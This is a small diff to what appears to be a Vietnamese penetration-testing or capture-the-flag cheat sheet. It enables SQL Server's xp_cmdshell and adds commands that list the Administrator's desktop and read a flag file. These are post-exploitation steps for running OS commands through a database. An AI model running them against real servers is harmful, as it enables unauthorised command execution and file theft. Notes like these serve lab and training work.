@@ -159,6 +159,9 @@ EXEC sp_configure 'show advanced options',1;	(Bật nếu cần)
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
+
+EXEC xp_cmdshell 'dir C:\Users\Administrator\Desktop';
+EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
 ```
 # Android
 ```
